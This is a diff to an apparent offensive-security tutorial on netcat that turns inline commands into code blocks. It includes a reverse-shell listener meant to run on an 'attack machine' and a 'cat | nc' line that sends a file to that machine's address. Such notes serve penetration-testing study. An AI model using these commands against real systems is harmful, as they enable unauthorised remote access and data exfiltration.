@@ -4,9 +4,8 @@ There isn't much that netcat can't do. It allows different types of communicatio
 
 ## Usage
 
-Running `nc -h` provided the following output:
-
 ```bash
+$ nc -h
 OpenBSD netcat (Debian patchlevel 1.206-1ubuntu1)
 usage: nc [-46CDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl]
 	  [-m minttl] [-O length] [-P proxy_username] [-p source_port]
@@ -55,7 +54,9 @@ usage: nc [-46CDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl]
 
 Now and then I'll use netcat to connect to a port on a machine. Usually this happens when I am trying to figure out what is running on the given port. As an example, I am going to connect to the machine at 10.10.1.1 on port 1337. The syntax is very simple:
 
-`nc 10.10.1.1 1337`
+```bash
+$ nc 10.10.1.1 1337
+```
 
 From here you can start typing to see how the port handles the message. It varies based on what is listening on that port.
 
@@ -63,7 +64,9 @@ From here you can start typing to see how the port handles the message. It varie
 
 This is by far the most common use I have for netcat. I will list on my attack machine so that I can get a reverse shell onto the machine I am attacking. Here is the syntax:
 
-`nc -lvnp 4444`
+```bash
+$ nc -lvnp 4444
+````
 
 Here is what the command is doing:
 
@@ -90,7 +93,9 @@ Netcat has the ability to also send files between machines. I will show how to r
 
 I need to setup the receiver first. Here is the syntax:
 
-`nc -lp 4444 -q 5 > output.txt < /dev/null`
+```bash
+$ nc -lp 4444 -q 5 > output.txt < /dev/null
+```
 
 Here is a explaination about the command:
 
@@ -104,7 +109,9 @@ Here is a explaination about the command:
 
 The sending is even easier than the above command. Here is the syntax:
 
-`cat output.txt | nc 10.10.1.1 4444`
+```bash
+$ cat output.txt | nc 10.10.1.1 4444
+```
 
 Cat will grab the text in output.txt and send it to my attack machine on port 4444.
 
